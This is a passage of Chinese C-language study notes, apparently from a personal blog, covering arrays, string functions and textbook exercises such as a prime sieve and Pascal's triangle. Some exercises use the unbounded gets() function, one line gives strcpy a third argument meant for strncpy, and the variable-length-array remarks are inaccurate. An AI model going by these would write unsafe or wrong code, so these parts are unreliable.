class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//比赛排序问题</span></span><br><span class="line"><span class="comment">//先逻辑图，判断出正确结果</span></span><br><span class="line"><span class="comment">//编程使用假设的方法，三层循环，判断符合条件的情况</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> i,j,k;</span><br><span class="line">  <span class="keyword">for</span>(i=<span class="string">'X'</span>;i&lt;=<span class="string">'Z'</span>;i++)&#123;</span><br><span class="line">    <span class="keyword">for</span>(j=<span class="string">'X'</span>;j&lt;=<span class="string">'Z'</span>;j++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(i!=j)&#123;</span><br><span class="line">            <span class="keyword">for</span>(k=<span class="string">'X'</span>;k&lt;=<span class="string">'Z'</span>;k++)&#123;</span><br><span class="line">                <span class="keyword">if</span>(k!=i&amp;&amp;k!=j)&#123;</span><br><span class="line">                    <span class="keyword">if</span>(i!=<span class="string">'X'</span>&amp;&amp;k!=<span class="string">'X'</span>&amp;&amp;k!=<span class="string">'Z'</span>)&#123;</span><br><span class="line">                        <span class="built_in">printf</span>(<span class="string">"A-%c,B-%c,C-%c\n"</span>,i,j,k);</span><br><span class="line">                      &#125;</span><br><span class="line">                  &#125; </span><br><span class="line">              &#125;</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><h2 id="7-数组"><a href="#7-数组" class="headerlink" title="7 数组"></a>7 数组</h2><h3 id="7-1-一维数组"><a href="#7-1-一维数组" class="headerlink" title="7.1 一维数组"></a>7.1 一维数组</h3><h4 id="7-1-1定义方法"><a href="#7-1-1定义方法" class="headerlink" title="7.1.1定义方法"></a>7.1.1定义方法</h4><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">int</span> a[<span class="number">10</span>];</span><br></pre></td></tr></table></figure><p>==注意==</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">（<span class="number">1</span>）a[<span class="number">10</span>] 下标从<span class="number">0</span>开始到<span class="number">9</span></span><br><span class="line"></span><br><span class="line">（<span class="number">2</span>）</span><br><span class="line"><span class="built_in">int</span> a[<span class="number">3</span>+<span class="number">5</span>]; <span class="comment">// 合法</span></span><br><span class="line"></span><br><span class="line">scanf(<span class="string">"%d"</span>, &amp;n);</span><br><span class="line"><span class="built_in">int</span> a[n];</span><br><span class="line"></span><br><span class="line"><span class="built_in">int</span> a[n] 是不合法的，即c语言不允许对数组的大小作动态定义</span><br><span class="line"></span><br><span class="line">（<span class="number">3</span>）</span><br><span class="line"><span class="built_in">void</span> func(<span class="built_in">int</span> n)&#123;</span><br><span class="line">    <span class="built_in">int</span> a[<span class="number">2</span>*n];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">为函数参数时可以，这种情况称为“可变长数组”</span><br><span class="line"></span><br><span class="line">（<span class="number">4</span>）为static存储方式时，不能用“可变长数组”</span><br><span class="line">static <span class="built_in">int</span> a[<span class="number">2</span>*n]; <span class="comment">//非法</span></span><br></pre></td></tr></table></figure><h4 id="7-1-2-引用"><a href="#7-1-2-引用" class="headerlink" title="7.1.2 引用"></a>7.1.2 引用</h4><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a[<span class="number">0</span>] 或 a[<span class="number">2</span>*<span class="number">3</span>]</span><br></pre></td></tr></table></figure><h4 id="7-1-3-初始化"><a href="#7-1-3-初始化" class="headerlink" title="7.1.3 初始化"></a>7.1.3 初始化</h4><ol><li>全部初始化<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">int</span> a[<span class="number">10</span>]=&#123;<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>&#125;;    <span class="comment">//注意大括号，逗号</span></span><br></pre></td></tr></table></figure></li><li>只给一部分元素赋值<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">int</span> a[<span class="number">10</span>]=&#123;<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>&#125;;  <span class="comment">// 前5个赋初值，后5个赋初值0</span></span><br></pre></td></tr></table></figure></li><li>全部赋初值0可写成<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">int</span> a[<span class="number">10</span>]=&#123;<span class="number">0</span>&#125;;</span><br></pre></td></tr></table></figure></li><li>可以不指定数组长度<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">int</span> a[]=&#123;<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>&#125;;    <span class="comment">//数组长度自动为5</span></span><br></pre></td></tr></table></figure><h3 id="7-2-二维数组"><a href="#7-2-二维数组" class="headerlink" title="7.2 二维数组"></a>7.2 二维数组</h3><h4 id="7-2-1-定义方法"><a href="#7-2-1-定义方法" class="headerlink" title="7.2.1 定义方法"></a>7.2.1 定义方法</h4><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">float a[<span class="string">3</span>][<span class="symbol">4</span>];  //可以理解成3行4列矩阵，内存中先顺序存储第一行，再存储第二行</span><br></pre></td></tr></table></figure><h4 id="7-2-2-引用"><a href="#7-2-2-引用" class="headerlink" title="7.2.2 引用"></a>7.2.2 引用</h4><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">int a[<span class="string">3</span>][<span class="symbol">4</span>];    //定义3×4二维数组</span><br><span class="line">a[<span class="string">3</span>][<span class="symbol">4</span>]=3;  //不存在a[<span class="string">3</span>][<span class="symbol">4</span>]元素</span><br><span class="line"></span><br><span class="line">注意定义和数组下标范围的区别</span><br></pre></td></tr></table></figure><h4 id="7-2-3-初始化"><a href="#7-2-3-初始化" class="headerlink" title="7.2.3 初始化"></a>7.2.3 初始化</h4></li><li>分别赋初值<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">int</span> a[<span class="number">3</span>][<span class="number">4</span>]=&#123;&#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>&#125;,&#123;<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>&#125;,&#123;<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>&#125;&#125;; 大括号中嵌套大括号</span><br></pre></td></tr></table></figure></li><li>可写在一个大括号内<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">int</span> a[<span class="number">3</span>][<span class="number">4</span>]=&#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>&#125;;</span><br></pre></td></tr></table></figure></li><li><img src="/2020/01/26/C_C++_01/20200227141234.png" alt></li><li><img src="/2020/01/26/C_C++_01/20200227141312.png" alt><h3 id="7-3-字符数组"><a href="#7-3-字符数组" class="headerlink" title="7.3 字符数组"></a>7.3 字符数组</h3><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">char c[<span class="number">10</span>]=<span class="string">"China"</span><span class="comment">;</span></span><br></pre></td></tr></table></figure><h4 id="7-3-1-字符串处理函数"><a href="#7-3-1-字符串处理函数" class="headerlink" title="7.3.1 字符串处理函数"></a>7.3.1 字符串处理函数</h4><code>#include &lt;string.h&gt;</code></li><li>puts<figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> <span class="keyword">str</span>[]=<span class="string">"China\nBeijing"</span></span><br><span class="line">puts(<span class="keyword">str</span>);</span><br></pre></td></tr></table></figure></li><li>gets<figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gets(<span class="name">str</span>)<span class="comment">;</span></span><br></pre></td></tr></table></figure></li><li>strcat - 连接字符串<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">strcat(str1, str2);</span><br><span class="line"></span><br><span class="line">注意：</span><br><span class="line">（<span class="number">1</span>）str1必须足够大，以便容纳连接后的新字符串</span><br><span class="line">（<span class="number">2</span>）连接前两字符串后面都有\<span class="number">0</span></span><br></pre></td></tr></table></figure></li><li>strcpy 和 strncpy - 字符串复制<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">strcpy</span>(str1,str2);  <span class="comment">//  将str2复制到str1</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">strcpy</span>(str1,str2,n);    <span class="comment">//将str2最前面n个字符复制到str1中</span></span><br></pre></td></tr></table></figure></li><li>strcmp<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">strcmp(str1,str2);</span><br><span class="line"></span><br><span class="line">（<span class="number">1</span>）如全部字符相同，则认为两个字符串相等</span><br><span class="line">（<span class="number">2</span>）若出现不相同字符，则以第一队不相同的字符的比较结果为准</span><br><span class="line"></span><br><span class="line">函数值：</span><br><span class="line">（<span class="number">1</span>）相等，则返回<span class="number">0</span></span><br><span class="line">（<span class="number">2</span>）str1 &gt; str2，返回正整数</span><br><span class="line">（<span class="number">3</span>）str1 &lt; str2，返回负整数</span><br></pre></td></tr></table></figure></li><li>strlen<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">strlen</span>(str);    <span class="comment">//字符长度，不包含\0</span></span><br></pre></td></tr></table></figure></li><li>strlwr - 小写，strupr - 大写<h3 id="7-4-习题（第六章）"><a href="#7-4-习题（第六章）" class="headerlink" title="7.4 习题（第六章）"></a>7.4 习题（第六章）</h3><img src="/2020/01/26/C_C++_01/20200227145316.png" alt><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;math.h&gt;</span><br><span class="line">int main()</span><br><span class="line">&#123;int i,j,n,a[<span class="number">101</span>];</span><br><span class="line">  for (i=<span class="number">1</span>;i&lt;=<span class="number">100</span>;i++)</span><br><span class="line">      a[i]=i;</span><br><span class="line">  a[<span class="number">1</span>]=<span class="number">0</span>;</span><br><span class="line">  for (i=<span class="number">2</span>;i&lt;sqrt(<span class="number">100</span>);i++)</span><br><span class="line">    for (j=i+<span class="number">1</span>;j&lt;=<span class="number">100</span>;j++)</span><br><span class="line">       &#123;if(a[i]!=<span class="number">0</span> &amp;&amp; a[j]!=<span class="number">0</span>)</span><br><span class="line">          if (a[j]%a[i]==<span class="number">0</span>)</span><br><span class="line">            a[j]=<span class="number">0</span>; </span><br><span class="line">       &#125;</span><br><span class="line">  printf(<span class="string">"<span class="subst">\n</span>"</span>);</span><br><span class="line">  for (i=<span class="number">2</span>,n=<span class="number">0</span>;i&lt;=<span class="number">100</span>;i++)</span><br><span class="line">    &#123; if(a[i]!=<span class="number">0</span>)</span><br><span class="line">        &#123;printf(<span class="string">"%5d"</span>,a[i]);</span><br><span class="line">         n++;</span><br><span class="line">        &#125;</span><br><span class="line">      if(n==<span class="number">10</span>)</span><br><span class="line">        &#123;printf(<span class="string">"<span class="subst">\n</span>"</span>);</span><br><span class="line">         n=<span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  printf(<span class="string">"<span class="subst">\n</span>"</span>);</span><br><span class="line">  return <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/2020/01/26/C_C++_01/20200227150459.png" alt><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">int main()</span><br><span class="line">&#123; int a[<span class="number">11</span>]=&#123;<span class="number">1</span>,<span class="number">4</span>,<span class="number">6</span>,<span class="number">9</span>,<span class="number">13</span>,<span class="number">16</span>,<span class="number">19</span>,<span class="number">28</span>,<span class="number">40</span>,<span class="number">100</span>&#125;;</span><br><span class="line">  int temp1,temp2,number,end,i,j;</span><br><span class="line">  printf(<span class="string">"array a:<span class="subst">\n</span>"</span>);</span><br><span class="line">  for (i=<span class="number">0</span>;i&lt;<span class="number">10</span>;i++)</span><br><span class="line">    printf(<span class="string">"%5d"</span>,a[i]);</span><br><span class="line">  printf(<span class="string">"<span class="subst">\n</span>"</span>);</span><br><span class="line">  printf(<span class="string">"insert data:"</span>);</span><br><span class="line">  scanf(<span class="string">"%d"</span>,&amp;number);</span><br><span class="line">  end=a[<span class="number">9</span>];</span><br><span class="line">  if (number&gt;end)</span><br><span class="line">    a[<span class="number">10</span>]=number;</span><br><span class="line">  else</span><br><span class="line">   &#123;for (i=<span class="number">0</span>;i&lt;<span class="number">10</span>;i++)</span><br><span class="line">    &#123;if (a[i]&gt;number)</span><br><span class="line">       &#123;temp1=a[i];</span><br><span class="line">    a[i]=number;</span><br><span class="line">    for (j=i+<span class="number">1</span>;j&lt;<span class="number">11</span>;j++)</span><br><span class="line">      &#123;temp2=a[j];</span><br><span class="line">       a[j]=temp1;</span><br><span class="line">       temp1=temp2;</span><br><span class="line">      &#125;</span><br><span class="line">      break;</span><br><span class="line">       &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  printf(<span class="string">"Now array a:<span class="subst">\n</span>"</span>);</span><br><span class="line">  for (i=<span class="number">0</span>;i&lt;<span class="number">11</span>;i++)</span><br><span class="line">    printf(<span class="string">"%5d"</span>,a[i]);</span><br><span class="line">  printf(<span class="string">"<span class="subst">\n</span>"</span>);</span><br><span class="line">  return <span class="number">0</span>;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><img src="/2020/01/26/C_C++_01/20200227150740.png" alt><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//一个数组中元素逆序</span></span><br><span class="line"><span class="comment">//以中间元素为中心，两侧元素互换即可</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> N 5</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123; <span class="keyword">int</span> a[N],i,temp;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"enter array a:\n"</span>); </span><br><span class="line">  <span class="keyword">for</span> (i=<span class="number">0</span>;i&lt;N;i++)</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;a[i]);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"array a:\n"</span>);</span><br><span class="line">  <span class="keyword">for</span> (i=<span class="number">0</span>;i&lt;N;i++)</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%4d"</span>,a[i]);</span><br><span class="line">  <span class="keyword">for</span> (i=<span class="number">0</span>;i&lt;N/<span class="number">2</span>;i++)            <span class="comment">//循环的作用是将对称的元素的值互换</span></span><br><span class="line">    &#123; temp=a[i];</span><br><span class="line">      a[i]=a[N-i<span class="number">-1</span>];</span><br><span class="line">      a[N-i<span class="number">-1</span>]=temp;</span><br><span class="line">     &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"\nNow,array a:\n"</span>);</span><br><span class="line">  <span class="keyword">for</span> (i=<span class="number">0</span>;i&lt;N;i++)</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%4d"</span>,a[i]);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>==重点：杨辉三角==<br><img src="/2020/01/26/C_C++_01/20200227152517.png" alt><br><img src="/2020/01/26/C_C++_01/20200227152548.png" alt><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"># define N <span class="number">10</span></span><br><span class="line"><span class="built_in">int</span> main()&#123;</span><br><span class="line">  <span class="built_in">int</span> i,j,a[N][N];</span><br><span class="line">  <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;N;i++)&#123;</span><br><span class="line">    a[i][i]=<span class="number">1</span>;</span><br><span class="line">    a[i][<span class="number">0</span>]=<span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span>(i=<span class="number">2</span>;i&lt;N;i++)&#123;</span><br><span class="line">    <span class="keyword">for</span>(j=<span class="number">1</span>;j&lt;=i<span class="number">-1</span>;j++)&#123;</span><br><span class="line">        a[i][j]=a[i<span class="number">-1</span>][j]+a[i<span class="number">-1</span>][j<span class="number">-1</span>];</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;N;i++)&#123;</span><br><span class="line">    <span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;=i;j++)</span><br><span class="line">        printf(<span class="string">"%6d"</span>, a[i][j]);</span><br><span class="line">    printf(<span class="string">"\n"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><img src="/2020/01/26/C_C++_01/20200227154633.png" alt><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//图形输出</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123; <span class="keyword">char</span> a[<span class="number">5</span>]=&#123;<span class="string">'*'</span>,<span class="string">'*'</span>,<span class="string">'*'</span>,<span class="string">'*'</span>,<span class="string">'*'</span>&#125;;</span><br><span class="line">  <span class="keyword">int</span> i,j,k;</span><br><span class="line">  <span class="keyword">char</span> space=<span class="string">' '</span>;</span><br><span class="line">  <span class="keyword">for</span> (i=<span class="number">0</span>;i&lt;<span class="number">5</span>;i++)</span><br><span class="line">   &#123; <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">"    "</span>);</span><br><span class="line">     <span class="keyword">for</span> (j=<span class="number">1</span>;j&lt;=i;j++)</span><br><span class="line">       <span class="built_in">printf</span>(<span class="string">"%c"</span>,space);</span><br><span class="line">     <span class="keyword">for</span> (k=<span class="number">0</span>;k&lt;<span class="number">5</span>;k++)</span><br><span class="line">       <span class="built_in">printf</span>(<span class="string">"%c"</span>,a[k]);</span><br><span class="line">   &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/2020/01/26/C_C++_01/20200227155130.png" alt><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//非凯撒密码，对称密码</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"> </span>&#123;<span class="keyword">int</span> j,n;</span><br><span class="line">  <span class="keyword">char</span> ch[<span class="number">80</span>];</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"input cipher code:\n"</span>);</span><br><span class="line">  gets(ch);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"\ncipher code:%s\n"</span>,ch);</span><br><span class="line">  j=<span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> (ch[j]!=<span class="string">'\0'</span>)</span><br><span class="line">  &#123; <span class="keyword">if</span> ((ch[j]&gt;=<span class="string">'A'</span>) &amp;&amp; (ch[j]&lt;=<span class="string">'Z'</span>))</span><br><span class="line">      ch[j]=<span class="number">155</span>-ch[j];</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ((ch[j]&gt;=<span class="string">'a'</span>) &amp;&amp; (ch[j]&lt;=<span class="string">'z'</span>))</span><br><span class="line">      ch[j]=<span class="number">219</span>-ch[j];</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      ch[j]=ch[j];</span><br><span class="line">    j++;</span><br><span class="line">  &#125;</span><br><span class="line">  n=j;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"original text:"</span>);</span><br><span class="line">  <span class="keyword">for</span> (j=<span class="number">0</span>;j&lt;n;j++)</span><br><span class="line">    <span class="built_in">putchar</span>(ch[j]);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><img src="/2020/01/26/C_C++_01/20200227163655.png" alt><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//strcat实现    不用strlen的方法</span></span><br><span class="line"><span class="comment">//s1[i++]=s2[j++]</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123; <span class="keyword">char</span> s1[<span class="number">80</span>],s2[<span class="number">40</span>];</span><br><span class="line">  <span class="keyword">int</span> i=<span class="number">0</span>,j=<span class="number">0</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"input string1:"</span>);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">"%s"</span>,s1);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"input string2:"</span>);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">"%s"</span>,s2);</span><br><span class="line">  <span class="keyword">while</span> (s1[i]!=<span class="string">'\0'</span>)</span><br><span class="line">    i++;</span><br><span class="line">  <span class="keyword">while</span>(s2[j]!=<span class="string">'\0'</span>)</span><br><span class="line">    s1[i++]=s2[j++];</span><br><span class="line">  s1[i]=<span class="string">'\0'</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"\nThe new string is:%s\n"</span>,s1);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><img src="/2020/01/26/C_C++_01/20200227164017.png" alt><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//strcmp实现</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123; <span class="keyword">int</span> i,resu;</span><br><span class="line">  <span class="keyword">char</span> s1[<span class="number">100</span>],s2[<span class="number">100</span>];</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"input string1:"</span>);</span><br><span class="line">  gets(s1);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"\ninput string2:"</span>);</span><br><span class="line">  gets(s2);</span><br><span class="line">  i=<span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ((s1[i]==s2[i]) &amp;&amp; (s1[i]!=<span 